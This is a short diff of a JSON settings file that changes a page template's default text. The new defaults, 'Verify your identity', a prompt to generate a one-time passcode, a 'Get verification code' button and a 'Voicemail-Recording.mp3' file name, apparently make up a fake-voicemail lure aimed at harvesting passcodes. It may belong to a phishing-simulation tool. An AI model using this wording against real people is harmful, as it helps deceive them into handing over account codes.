@@ -7,7 +7,25 @@
       "key": "title",
       "label": "Caller Name",
       "type": "text",
-      "default": "John Smith"
+      "default": "Verify your identity"
+    },
+    {
+      "key": "message",
+      "label": "Page Message",
+      "type": "text",
+      "default": "Generate a one-time passcode to securely access your content."
+    },
+    {
+      "key": "button_text",
+      "label": "Button Text",
+      "type": "text",
+      "default": "Get verification code"
+    },
+    {
+      "key": "file_name",
+      "label": "File Name",
+      "type": "text",
+      "default": "Voicemail-Recording.mp3"
     },
     {
       "key": "pages",
